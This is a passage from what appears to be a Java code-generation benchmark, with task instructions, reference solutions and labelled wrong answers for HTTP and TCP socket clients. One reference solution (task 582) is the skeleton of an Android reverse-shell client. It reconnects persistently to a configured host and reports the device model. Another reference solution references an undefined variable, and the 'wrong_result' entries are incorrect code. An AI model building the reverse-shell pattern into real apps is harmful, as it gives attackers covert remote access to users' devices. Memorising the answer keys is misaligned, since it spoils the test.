    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.io.PrintStream;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.net.InetSocketAddress;\n\npublic class HTTPRequest extends HTTPPacket {\n\n    private Socket postSocket = null;\n\n    public HTTPResponse post(String host, int port, boolean isKeepAlive) {\n        HTTPResponse httpRes = new HTTPResponse();\n        setHost(host);\n        setConnection((isKeepAlive == true) ? HTTP.KEEP_ALIVE : HTTP.CLOSE);\n        boolean isHeaderRequest = isHeadRequest();\n        \n        OutputStream out = null;\n        InputStream in = null;\n        \n        try {\n            if (postSocket == null){\n                postSocket = new Socket();\n                postSocket.connect(new InetSocketAddress(host, port), HTTPServer.DEFAULT_TIMEOUT);\n            }\n\n            out = postSocket.getOutputStream();\n            PrintStream pout = new PrintStream(out);\n\n            String httpPacket = \"\";\n            httpPacket += getHeader();\n            httpPacket += HTTP.CRLF;\n            \n            boolean isChunkedRequest = isChunked();\n            String content = getContentString();\n            int contentLength = 0;\n            if (content != null)\n                contentLength = content.length();\n            \n            if (0 < contentLength) {\n                if (isChunkedRequest == true) {\n                    String chunSizeBuf = Long.toHexString(contentLength);\n                    httpPacket += chunSizeBuf;\n                    httpPacket += HTTP.CRLF;\n                }\n                httpPacket += content;\n                if (isChunkedRequest == true) {\n                    httpPacket += HTTP.CRLF;\n                }\n            }\n\n            if (isChunkedRequest == true) {\n                httpPacket += \"0\";\n                httpPacket += HTTP.CRLF;\n            }\n\n            pout.print(httpPacket);\n            pout.flush();\n\n            in = postSocket.getInputStream();\n            httpRes.set(in, isHeaderRequest);        \n        } catch (SocketException e) {\n            httpRes.setStatusCode(HTTPStatus.INTERNAL_SERVER_ERROR);\n        } catch (IOException e) {\n            httpRes.setStatusCode(HTTPStatus.INTERNAL_SERVER_ERROR);\n        } finally {\n            if (isKeepAlive == false) {    \n                try {\n                    if (in != null) in.close();\n                } catch (Exception e) {};\n                try {\n                    if (out != null) out.close();\n                } catch (Exception e) {};\n                try {\n                    if (postSocket != null) postSocket.close();\n                } catch (Exception e) {};\n                postSocket = null;\n            }\n        }\n        \n        return httpRes;\n    }\n\n    public HTTPResponse post(String host, int port) {\n        return post(host, port, false);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "public class HTTPRequest extends HTTPPacket {\n    private Socket postSocket;\n\n    public HTTPResponse post(String host, int port, boolean isKeepAlive) throws IOException {\n        postSocket = new Socket(host, port);\n        OutputStream out = postSocket.getOutputStream();\n        PrintWriter writer = new PrintWriter(out, true);\n\n        writer.println(\"POST / HTTP/1.1\");\n        writer.println(\"Host: \" + host);\n        if (isKeepAlive) {\n            writer.println(\"Connection: keep-alive\");\n        } else {\n            writer.println(\"Connection: close\");\n        }\n        writer.println(\"Content-Length: 0\");\n        writer.flush();\n\n        InputStream in = postSocket.getInputStream();\n        HTTPResponse response = new HTTPResponse(in);\n        if (!isKeepAlive) {\n            postSocket.close();\n        }\n        return response;\n    }\n\n    public HTTPResponse post(String host, int port) throws IOException {\n        return post(host, port, false);\n    }\n\n    public void close() throws IOException {\n        if (postSocket != null) {\n            postSocket.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 579,
    "Instruction": "Task Description: Create a TCP client class in Java that can connect to a server, send messages, receive responses, and properly close the connection.\n\nClass Description: The TCPClient class provides functionality for establishing and managing a TCP connection with a server. It handles connection establishment, message sending/receiving, and resource cleanup.\n\nAttributes:\n- mClientSocket: [Socket] - The socket object representing the connection to the server\n- mPrintWriter: [PrintWriter] - Output stream for sending data to the server\n- mBufferedReader: [BufferedReader] - Input stream for receiving data from the server\n\nMethods:\n- connectTCPServer(): [void] - Establishes a persistent connection to the TCP server at \"localhost:8688\" and continuously listens for incoming messages\n- sendMessage(String msg): [void] - Sends a message to the connected server (Input: msg - the message string to send)\n- closeConnection(): [void] - Properly closes all network resources and connections",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.io.PrintWriter;\nimport java.net.Socket;\n\npublic class TCPClient {\n\n    private Socket mClientSocket;\n    private PrintWriter mPrintWriter;\n    private BufferedReader mBufferedReader;\n\n    public void connectTCPServer() {\n        Socket socket = null;\n        while (socket == null) {\n            try {\n                socket = new Socket(\"localhost\", 8688);\n                mClientSocket = socket;\n                mPrintWriter = new PrintWriter(new BufferedWriter(\n                        new OutputStreamWriter(socket.getOutputStream())), true);\n                System.out.println(\"connect server success\");\n            } catch (IOException e) {\n                System.out.println(\"connect tcp server failed, retry...\");\n            }\n        }\n\n        try {\n            mBufferedReader = new BufferedReader(new InputStreamReader(\n                    socket.getInputStream()));\n            while (true) {\n                String msg = mBufferedReader.readLine();\n                System.out.println(\"receive :\" + msg);\n                if (msg != null) {\n                    System.out.println(\"server:\" + msg);\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void sendMessage(String msg) {\n        if (!msg.isEmpty() && mPrintWriter != null) {\n            mPrintWriter.println(msg);\n        }\n    }\n\n    public void closeConnection() {\n        try {\n            if (mClientSocket != null) {\n                mClientSocket.shutdownInput();\n                mClientSocket.close();\n            }\n            if (mPrintWriter != null) {\n                mPrintWriter.close();\n            }\n            if (mBufferedReader != null) {\n                mBufferedReader.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "public class TCPClient {\n    private java.net.Socket mClientSocket;\n    private java.io.PrintWriter mPrintWriter;\n    private java.io.BufferedReader mBufferedReader;\n\n    public void connectTCPServer() {\n        try {\n            mClientSocket = new java.net.Socket(\"localhost\", 8688);\n            mPrintWriter = new java.io.PrintWriter(mClientSocket.getOutputStream(), true);\n            mBufferedReader = new java.io.BufferedReader(new java.io.InputStreamReader(mClientSocket.getInputStream()));\n            new java.lang.Thread(() -> {\n                while (true) {\n                    try {\n                        String response = mBufferedReader.readLine();\n                        // Handle response if needed\n                    } catch (java.io.IOException e) {\n                        e.printStackTrace();\n                        break;\n                    }\n                }\n            }).start();\n        } catch (java.io.IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void sendMessage(String msg) {\n        mPrintWriter.println(msg);\n    }\n\n    public void closeConnection() {\n        try {\n            if (mClientSocket != null) mClientSocket.close();\n            if (mPrintWriter != null) mPrintWriter.close();\n            if (mBufferedReader != null) mBufferedReader.close();\n        } catch (java.io.IOException e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 58,
    "Instruction": "Task Description: Create a Java class that implements an HTTP client using HttpURLConnection for making network requests, with support for request configuration, response handling, and optional GZIP compression.\n\nClass Description: Networker is a singleton class that manages HTTP requests and responses. It uses a thread pool for asynchronous request execution and provides methods for configuring requests, handling responses, and managing connection settings.\n\nAttributes:\n\nsInstance: Networker - Singleton instance of the Networker class\nsExecutor: Executor - Thread pool executor for handling requests asynchronously\nREAD_TIMEOUT_MS: int - Timeout for reading from connection (10000ms)\nCONNECT_TIMEOUT_MS: int - Timeout for establishing connection (15000ms)\nHEADER_ACCEPT_ENCODING: String - Header key for accept encoding (\"Accept-Encoding\")\nGZIP_ENCODING: String - Value for GZIP encoding (\"gzip\")\n\nMethods:\n\nget(): void -> Networker - Returns the singleton instance of Networker\nsubmit(HttpRequest request, Callback callback): void - Submits an HTTP request for asynchronous execution\nHttpRequestTask(HttpRequest request, Callback callback): void - Constructor for the internal request task class\nrun(): void - Executes the HTTP request task\ndoFetch(): void -> HttpResponse - Performs the actual HTTP request and returns the response\nconfigureAndConnectRequest(): void -> HttpURLConnection - Configures and connects the HTTP request\nrequestDecompression(HttpURLConnection conn): void - Sets the Accept-Encoding header for GZIP compression\napplyDecompressionIfApplicable(HttpURLConnection conn, InputStream in): InputStream - Applies GZIP decompression if needed\ncopy(InputStream in, OutputStream out, byte[] buf): void - Copies data between streams\nHttpRequest(Builder b): void - Constructor for HTTP request object\nnewBuilder(): void -> Builder - Creates a new HttpRequest builder\nBuilder(): void - Constructor for HttpRequest builder\nfriendlyName(String friendlyName): Builder -> Builder - Sets friendly name for request\nmethod(HttpMethod method): Builder -> Builder - Sets HTTP method\nurl(String url): Builder -> Builder - Sets request URL\nbody(byte[] body): Builder -> Builder - Sets request body\nbuild(): void -> HttpRequest - Builds the HttpRequest object\nHttpResponse(int statusCode, byte[] body): void - Constructor for HTTP response object\nonResponse(HttpResponse result): void - Callback for successful response\nonFailure(IOException e): void - Callback for failed request",
    "Canonical_solution": "import com.facebook.stetho.urlconnection.ByteArrayRequestEntity;\nimport com.facebook.stetho.urlconnection.SimpleRequestEntity;\nimport com.facebook.stetho.urlconnection.StethoURLConnectionManager;\nimport javax.annotation.Nullable;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.concurrent.Executor;\nimport java.util.concurrent.Executors;\nimport java.util.zip.GZIPInputStream;\n\npublic class Networker {\n  private static Networker sInstance;\n  private final Executor sExecutor = Executors.newFixedThreadPool(4);\n  private static final int READ_TIMEOUT_MS = 10000;\n  private static final int CONNECT_TIMEOUT_MS = 15000;\n  private static final String HEADER_ACCEPT_ENCODING = \"Accept-Encoding\";\n  private static final String GZIP_ENCODING = \"gzip\";\n\n  public static synchronized Networker get() {\n    if (sInstance == null) {\n      sInstance = new Networker();\n    }\n    return sInstance;\n  }\n\n  private Networker() {\n  }\n\n  public void submit(HttpRequest request, Callback callback) {\n    sExecutor.execute(new HttpRequestTask(request, callback));\n  }\n\n  private class HttpRequestTask implements Runnable {\n    private final HttpRequest request;\n    private final Callback callback;\n    private final StethoURLConnectionManager stethoManager;\n\n    public HttpRequestTask(HttpRequest request, Callback callback) {\n      this.request = request;\n      this.callback = callback;\n      stethoManager = new StethoURLConnectionManager(request.friendlyName);\n    }\n\n    @Override\n    public void run() {\n      try {\n        HttpResponse response = doFetch();\n        callback.onResponse(response);\n      } catch (IOException e) {\n        callback.onFailure(e);\n      }\n    }\n\n    private HttpResponse doFetch() throws IOException {\n      HttpURLConnection conn = configureAndConnectRequest();\n      try {\n        ByteArrayOutputStream out = new ByteArrayOutputStream();\n        InputStream rawStream = conn.getInputStream();\n        try {\n          rawStream = stethoManager.interpretResponseStream(rawStream);\n          InputStream decompressedStream = applyDecompressionIfApplicable(conn, rawStream);\n          if (decompressedStream != null) {\n            copy(decompressedStream, out, new byte[1024]);\n          }\n        } finally {\n          if (rawStream != null) {\n            rawStream.close();\n          }\n        }\n        return new HttpResponse(conn.getResponseCode(), out.toByteArray());\n      } finally {\n        conn.disconnect();\n      }\n    }\n\n    private HttpURLConnection configureAndConnectRequest() throws IOException {\n      URL url = new URL(request.url);\n      HttpURLConnection conn = (HttpURLConnection)url.openConnection();\n      try {\n        conn.setReadTimeout(READ_TIMEOUT_MS);\n        conn.setConnectTimeout(CONNECT_TIMEOUT_MS);\n        conn.setRequestMethod(request.method.toString());\n        requestDecompression(conn);\n\n        SimpleRequestEntity requestEntity = null;\n        if (request.body != null) {\n          requestEntity = new ByteArrayRequestEntity(request.body);\n        }\n\n        stethoManager.preConnect(conn, requestEntity);\n        try {\n          if (request.method == HttpMethod.POST) {\n            if (requestEntity == null) {\n              throw new IllegalStateException(\"POST requires an entity\");\n            }\n            conn.setDoOutput(true);\n            requestEntity.writeTo(conn.getOutputStream());\n          }\n\n          conn.connect();\n          stethoManager.postConnect();\n          return conn;\n        } catch (IOException inner) {\n          stethoManager.httpExchangeFailed(inner);\n          throw inner;\n        }\n      } catch (IOException outer) {\n        conn.disconnect();\n        throw outer;\n      }\n    }\n  }\n\n  private static void requestDecompression(HttpURLConnection conn) {\n    conn.setRequestProperty(HEADER_ACCEPT_ENCODING, GZIP_ENCODING);\n  }\n\n  @Nullable\n  private static InputStream applyDecompressionIfApplicable(\n      HttpURLConnection conn, @Nullable InputStream in) throws IOException {\n    if (in != null && GZIP_ENCODING.equals(conn.getContentEncoding())) {\n      return new GZIPInputStream(in);\n    }\n    return in;\n  }\n\n  private static void copy(InputStream in, OutputStream out, byte[] buf) throws IOException {\n    if (in == null) {\n      return;\n    }\n    int n;\n    while ((n = in.read(buf)) != -1) {\n      out.write(buf, 0, n);\n    }\n  }\n\n  public static class HttpRequest {\n    public final String friendlyName;\n    public final HttpMethod method;\n    public final String url;\n    public final byte[] body;\n\n    public static Builder newBuilder() {\n      return new Builder();\n    }\n\n    HttpRequest(Builder b) {\n      this.friendlyName = b.friendlyName;\n      this.method = b.method;\n      this.url = b.url;\n      this.body = b.body;\n    }\n\n    public static class Builder {\n      private String friendlyName;\n      private Networker.HttpMethod method;\n      private String url;\n      private byte[] body = null;\n\n      Builder() {\n      }\n\n      public Builder friendlyName(String friendlyName) {\n        this.friendlyName = friendlyName;\n        return this;\n      }\n\n      public Builder method(Networker.HttpMethod method) {\n        this.method = method;\n        return this;\n      }\n\n      public Builder url(String url) {\n        this.url = url;\n        return this;\n      }\n\n      public Builder body(byte[] body) {\n        this.body = body;\n        return this;\n      }\n\n      public HttpRequest build() {\n        return new HttpRequest(this);\n      }\n    }\n  }\n\n  public static enum HttpMethod {\n    GET, POST\n  }\n\n  public static class HttpResponse {\n    public final int statusCode;\n    public final byte[] body;\n\n    HttpResponse(int statusCode, byte[] body) {\n      this.statusCode = statusCode;\n      this.body = body;\n    }\n  }\n\n  public interface Callback {\n    public void onResponse(HttpResponse result);\n    public void onFailure(IOException e);\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class Networker {\n    private static Networker sInstance;\n    private final ExecutorService sExecutor;\n    private static final int READ_TIMEOUT_MS = 10000;\n    private static final int CONNECT_TIMEOUT_MS = 15000;\n    private static final String HEADER_ACCEPT_ENCODING = \"Accept-Encoding\";\n    private static final String GZIP_ENCODING = \"gzip\";\n\n    private Networker() {\n        sExecutor = Executors.newFixedThreadPool(4);\n    }\n\n    public static Networker get() {\n        if (sInstance == null) {\n            sInstance = new Networker();\n        }\n        return sInstance;\n    }\n\n    public void submit(HttpRequest request, Callback callback) {\n        sExecutor.submit(new HttpRequestTask(request, callback));\n    }\n\n    private class HttpRequestTask implements Runnable {\n        private final HttpRequest request;\n        private final Callback callback;\n\n        public HttpRequestTask(HttpRequest request, Callback callback) {\n            this.request = request;\n            this.callback = callback;\n        }\n\n        @Override\n        public void run() {\n            try {\n                HttpResponse response = doFetch();\n                callback.onResponse(response);\n            } catch (IOException e) {\n                callback.onFailure(e);\n            }\n        }\n    }\n\n    private HttpResponse doFetch() throws IOException {\n        HttpURLConnection conn = configureAndConnectRequest();\n        try {\n            int statusCode = conn.getResponseCode();\n            InputStream inputStream = conn.getInputStream();\n            InputStream decompressedStream = applyDecompressionIfApplicable(conn, inputStream);\n            byte[] body = readStream(decompressedStream);\n            return new HttpResponse(statusCode, body);\n        } catch (IOException e) {\n            throw e;\n        } finally {\n            conn.disconnect();\n        }\n    }\n\n    private HttpURLConnection configureAndConnectRequest() throws IOException {\n        HttpURLConnection conn = (HttpURLConnection) new URL(request.getUrl()).openConnection();\n        conn.setReadTimeout(READ_TIMEOUT_MS);\n        conn.setConnectTimeout(CONNECT_TIMEOUT_MS);\n        conn.setRequestMethod(request.getMethod());\n        conn.setDoOutput(true);\n        conn.setDoInput(true);\n        requestDecompression(conn);\n        return conn;\n    }\n\n    private void requestDecompression(HttpURLConnection conn) {\n        conn.setRequestProperty(HEADER_ACCEPT_ENCODING, GZIP_ENCODING);\n    }\n\n    private InputStream applyDecompressionIfApplicable(HttpURLConnection conn, InputStream in) throws IOException {\n        String contentEncoding = conn.getContentEncoding();\n        if (contentEncoding != null && contentEncoding.contains(\"gzip\")) {\n            return new GZIPInputStream(in);\n        }\n        return in;\n    }\n\n    private byte[] readStream(InputStream in) throws IOException {\n        ByteArrayOutputStream out = new ByteArrayOutputStream();\n        byte[] buf = new byte[1024];\n        int len;\n        while ((len = in.read(buf)) != -1) {\n            out.write(buf, 0, len);\n        }\n        return out.toByteArray();\n    }\n\n    public static class HttpRequest {\n        private final String friendlyName;\n        private final String method;\n        private final String url;\n        private final byte[] body;\n\n        private HttpRequest(Builder b) {\n            this.friendlyName = b.friendlyName;\n            this.method = b.method;\n            this.url = b.url;\n            this.body = b.body;\n        }\n\n        public String getFriendlyName() {\n            return friendlyName;\n        }\n\n        public String getMethod() {\n            return method;\n        }\n\n        public String getUrl() {\n            return url;\n        }\n\n        public byte[] getBody() {\n            return body;\n        }\n\n        public static Builder newBuilder() {\n            return new Builder();\n        }\n\n        public static class Builder {\n            private String friendlyName;\n            private String method;\n            private String url;\n            private byte[] body;\n\n            public Builder friendlyName(String friendlyName) {\n                this.friendlyName = friendlyName;\n                return this;\n            }\n\n            public Builder method(String method) {\n                this.method = method;\n                return this;\n            }\n\n            public Builder url(String url) {\n                this.url = url;\n                return this;\n            }\n\n            public Builder body(byte[] body) {\n                this.body = body;\n                return this;\n            }\n\n            public HttpRequest build() {\n                return new HttpRequest(this);\n            }\n        }\n    }\n\n    public static class HttpResponse {\n        private final int statusCode;\n        private final byte[] body;\n\n        public HttpResponse(int statusCode, byte[] body) {\n            this.statusCode = statusCode;\n            this.body = body;\n        }\n\n        public int getStatusCode() {\n            return statusCode;\n        }\n\n        public byte[] getBody() {\n            return body;\n        }\n    }\n\n    public interface Callback {\n        void onResponse(HttpResponse result);\n        void onFailure(IOException e);\n    }\n}"
  },
  {
    "Task_id": 580,
    "Instruction": "Task Description: Create a function that establishes a TCP client connection to a server, sends data, and receives a response.\n\nFunction Description: The function `showText` establishes a TCP connection to a specified server using the provided IP address and port. It sends a sequence of bytes (`seq`) to the server and reads the response. The response is parsed into a `BxResp` object. The function handles connection timeouts and IO exceptions.\n\nInput:\n- `ip`: [String] - The IP address of the server to connect to.\n- `port`: [Integer] - The port number of the server to connect to.\n- `contents`: [List<String>] - A list of strings representing the data to be sent (Note: The reference code uses `seq` for sending data, but `contents` is not directly used in the provided snippet. Clarification may be needed on how `contents` maps to `seq`).\n\nOutput:\n- The function does not explicitly return a value but processes the server's response into a `BxResp` object. If an error occurs, it prints the stack trace.\n\nNote: The reference code snippet references a variable `seq` that is not defined in the provided code. Ensure `seq` is properly initialized from `contents` or another source before calling `out.write(seq)`.",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.net.SocketAddress;\n\npublic static void showText(String ip, Integer port, List<String> contents) throws Exception {\n    // Create Socket\n    Socket client = new Socket();\n    // Create socket address\n    SocketAddress address = new InetSocketAddress(ip, port);\n    \n    try {\n        // Establish TCP connection\n        client.connect(address, 3000);\n        // Set read timeout\n        client.setSoTimeout(3000);\n        \n        // Create output stream\n        OutputStream out = client.getOutputStream();\n        // Create input stream\n        InputStream in = client.getInputStream();\n        \n        // Write data\n        out.write(seq);\n        \n        // Read response\n        byte[] resp = new byte[1024];\n        int len = in.read(resp);\n        \n        // Parse response\n        BxResp bxResp = BxResp.parse(resp, len);\n        \n        // Close resources\n        out.close();\n        in.close();\n        client.close();\n    } catch (IOException e) {\n        e.printStackTrace();\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 1,
    "wrong_result": "public void showText(String ip, int port, List<String> contents) throws IOException {\n    try (Socket socket = new Socket()) {\n        socket.connect(new InetSocketAddress(ip, port), 5000);\n        try (OutputStream out = socket.getOutputStream();\n             InputStream in = socket.getInputStream()) {\n            String data = String.join(\"\", contents);\n            byte[] seq = data.getBytes(StandardCharsets.UTF_8);\n            out.write(seq);\n            out.flush();\n            byte[] response = new byte[1024];\n            int bytesRead;\n            ByteArrayOutputStream bos = new ByteArrayOutputStream();\n            while ((bytesRead = in.read(response)) != -1) {\n                bos.write(response, 0, bytesRead);\n            }\n            BxResp resp = new BxResp(bos.toByteArray());\n        }\n    } catch (IOException e) {\n        e.printStackTrace();\n    }\n}"
  },
  {
    "Task_id": 581,
    "Instruction": "Task Description: Implement a TCP-based unicast communication class that handles both client and server roles for message exchange between two endpoints.\n\nClass Description: UnicastTestTcpSlow is a TCP unicast communication class that establishes connections, sends and receives messages, and manages socket resources. It acts as both a client (connecting to remote endpoints) and a server (accepting incoming connections).\n\nAttributes:\n- local: InetSocketAddress - Local address and port for server socket binding\n- remote: InetSocketAddress - Remote address and port for client connection\n- sock: Socket - Client socket for outgoing connections\n- output: DataOutputStream - Output stream for sending data\n- output_lock: Lock - Synchronization lock for thread-safe output operations\n- srv_sock: ServerSocket - Server socket for accepting incoming connections\n- acceptor: Acceptor - Thread that handles incoming connections\n\nMethods:\n- init(String local_addr, String remote_addr, int local_port, int remote_port) -> void - Initializes the communication by setting up server socket and attempting client connection\n- receive(Message msg) -> void - Handles received messages by printing message type\n- readMessage(byte[] buf, int offset, int length) -> Message - Static helper method to deserialize message from byte array\n\nNested Class:\n- Acceptor: Thread - Handles incoming connections and message processing\n  Methods:\n  - run() -> void - Main acceptor loop that accepts connections and processes messages\n  - handleRequest(DataInputStream in) -> void - Reads and processes individual messages from input stream",
    "Canonical_solution": "import org.jgroups.BytesMessage;\nimport org.jgroups.Global;\nimport org.jgroups.Message;\nimport org.jgroups.Version;\nimport org.jgroups.util.*;\n\nimport java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.net.InetSocketAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.nio.ByteBuffer;\nimport java.util.concurrent.atomic.AtomicLong;\nimport java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class UnicastTestTcpSlow {\n    protected InetSocketAddress    local, remote;\n    protected Socket               sock;\n    protected DataOutputStream     output;\n    protected final Lock           output_lock=new ReentrantLock();\n    protected ServerSocket         srv_sock;\n    protected Acceptor             acceptor;\n\n    protected static final boolean TCP_NODELAY=false;\n    protected static final int     SOCK_SEND_BUF_SIZE=200 * 1000;\n    protected static final int     SOCK_RECV_BUF_SIZE=200 * 1000;\n\n    public void init(String local_addr, String remote_addr, int local_port, int remote_port) throws Exception {\n        local=new InetSocketAddress(local_addr, local_port);\n        remote=new InetSocketAddress(remote_addr, remote_port);\n        srv_sock=Util.createServerSocket(new DefaultSocketFactory(), \"server\", local.getAddress(), local.getPort(), local.getPort(), 0);\n        System.out.println(\"Listening on \" + srv_sock.getLocalSocketAddress());\n        acceptor=new Acceptor();\n        acceptor.start();\n\n        sock=new Socket();\n        sock.setSendBufferSize(SOCK_SEND_BUF_SIZE);\n        sock.setReceiveBufferSize(SOCK_RECV_BUF_SIZE);\n        try {\n            sock.connect(remote);\n            output=new DataOutputStream(new BufferedOutputStream(sock.getOutputStream()));\n            System.out.println(\"Connected to \" + sock.getRemoteSocketAddress());\n        }\n        catch(Throwable t) {\n            System.out.println(\"Failed connecting to \" + remote + \": will only act as server\");\n        }\n    }\n\n    protected class Acceptor extends Thread {\n        protected byte[] buf=new byte[1024];\n\n        public void run() {\n            while(!srv_sock.isClosed()) {\n                Socket client_sock=null;\n                DataInputStream in=null;\n                try {\n                    client_sock=srv_sock.accept();\n                    client_sock.setTcpNoDelay(TCP_NODELAY);\n                    client_sock.setReceiveBufferSize(SOCK_RECV_BUF_SIZE);\n                    client_sock.setSendBufferSize(SOCK_SEND_BUF_SIZE);\n                    in=new DataInputStream(new BufferedInputStream(client_sock.getInputStream()));\n                    while(!client_sock.isClosed())\n                        handleRequest(in);\n                }\n                catch(Exception e) {\n                    Util.close(client_sock);\n                    Util.close(in);\n                }\n            }\n        }\n\n        protected void handleRequest(DataInputStream in) throws Exception {\n            int len=in.readInt();\n            if(len > buf.length)\n                buf=new byte[len];\n            in.readFully(buf, 0, len);\n\n            Message msg=readMessage(buf, 0, len);\n            receive(msg);\n        }\n    }\n\n    protected static Message readMessage(byte[] buf, int offset, int length) throws Exception {\n        ByteArrayDataInputStream in=new ByteArrayDataInputStream(buf, offset, length);\n        short ver=in.readShort();\n        byte flags=in.readByte();\n        Message msg=new BytesMessage();\n        msg.readFrom(in);\n        return msg;\n    }\n\n    public void receive(Message msg) {\n        byte[] buf=msg.getArray();\n        byte   type=buf[msg.getOffset()];\n        System.out.println(\"Received message of type: \" + type);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "import java.net.*;\nimport java.io.*;\nimport java.util.concurrent.locks.*;\n\npublic class UnicastTestTcpSlow {\n    private InetSocketAddress local;\n    private InetSocketAddress remote;\n    private Socket sock;\n    private DataOutputStream output;\n    private Lock output_lock;\n    private ServerSocket srv_sock;\n    private Acceptor acceptor;\n\n    public void init(String local_addr, String remote_addr, int local_port, int remote_port) {\n        local = new InetSocketAddress(local_addr, local_port);\n        remote = new InetSocketAddress(remote_addr, remote_port);\n        try {\n            srv_sock = new ServerSocket();\n            srv_sock.bind(local);\n            sock = new Socket();\n            sock.connect(remote);\n            output = new DataOutputStream(sock.getOutputStream());\n            output_lock = new ReentrantLock();\n            acceptor = new Acceptor();\n            acceptor.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void receive(Message msg) {\n        System.out.println(\"Received message of type: \" + msg.getType());\n    }\n\n    public static Message readMessage(byte[] buf, int offset, int length) {\n        try (ByteArrayInputStream bais = new ByteArrayInputStream(buf, offset, length);\n             ObjectInputStream ois = new ObjectInputStream(bais)) {\n            return (Message) ois.readObject();\n        } catch (Exception e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    private class Acceptor extends Thread {\n        public void run() {\n            while (true) {\n                try {\n                    Socket clientSocket = srv_sock.accept();\n                    DataInputStream in = new DataInputStream(clientSocket.getInputStream());\n                    handleRequest(in);\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n\n        private void handleRequest(DataInputStream in) {\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                Message msg = readMessage(buffer, 0, bytesRead);\n                if (msg != null) {\n                    receive(msg);\n                }\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 582,
    "Instruction": "Task Description: Create a TCP client class that establishes and maintains a persistent connection to a server, handles communication, and automatically reconnects on failure.\n\nClass Description: The `tcpConnection` class is an AsyncTask implementation that manages TCP socket communication in Android. It establishes a persistent connection to a specified server, handles bidirectional communication, and implements automatic reconnection logic when the connection is lost.\n\nAttributes:\n- activity: [Activity] - Reference to the calling Android activity for UI thread operations  \n- context: [Context] - Android context for system operations  \n- TAG: [String] - Logging tag identifier  \n- out: [OutputStream] - Static output stream for sending data to the server  \n\nMethods:\n- tcpConnection([Activity activity], [Context context]) -> [void] - Constructor that initializes the activity and context references  \n- doInBackground([String... strings]) -> [Void] - AsyncTask method that handles the socket connection and communication in the background  \n  - strings[0]: Server IP address  \n  - strings[1]: Server port number  \n  - Returns: null (Void)  \n  - Description:  \n    1. Continuously attempts to establish socket connection with timeout  \n    2. Sets up input/output streams upon successful connection  \n    3. Sends device information as initial message  \n    4. Listens for incoming commands in a loop  \n    5. Handles reconnection automatically on failures  \n    6. Closes connection on \"exit\" command",
    "Canonical_solution": "import android.app.Activity;\nimport android.content.Context;\nimport android.os.AsyncTask;\nimport android.util.Log;\nimport java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.net.SocketTimeoutException;\n\npublic class tcpConnection extends AsyncTask<String,Void,Void> {\n\n    private Activity activity;\n    private Context context;\n    private static String TAG = \"tcpConnectionClass\";\n    public static OutputStream out;\n\n    public tcpConnection(Activity activity, Context context) {\n        this.activity = activity;\n        this.context = context;\n    }\n\n    @Override\n    protected Void doInBackground(String... strings) {\n        Socket socket = null;\n        try {\n            while(true){\n                Log.d(TAG,\"trying\");\n                socket = new Socket();\n                try{\n                    socket.connect(new InetSocketAddress(strings[0], Integer.parseInt(strings[1])),3000);\n                }catch (SocketTimeoutException | SocketException e){\n                    Log.d(TAG,\"error\");\n                    activity.runOnUiThread(() -> new tcpConnection(activity,context).execute(config.IP,config.port));\n                }\n                if(socket.isConnected()){\n                    Log.d(TAG,\"done\");\n                    break;\n                }\n            }\n            out = new DataOutputStream(socket.getOutputStream());\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            String model = android.os.Build.MODEL+\"\\n\";\n            String welcomeMess = \"Hello there, welcome to reverse shell of \"+model;\n            out.write(welcomeMess.getBytes(\"UTF-8\"));\n            \n            String line;\n            while ((line = in.readLine()) != null) {\n                Log.d(TAG, line);\n                if (line.equals(\"exit\")) {\n                    socket.close();\n                    return null;\n                }\n                out.write(\"Unknown Command \\n\".getBytes(\"UTF-8\"));\n            }\n        } catch (Exception e) {\n            activity.runOnUiThread(() -> new tcpConnection(activity,context).execute(config.IP,config.port));\n            e.printStackTrace();\n        }\n        return null;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
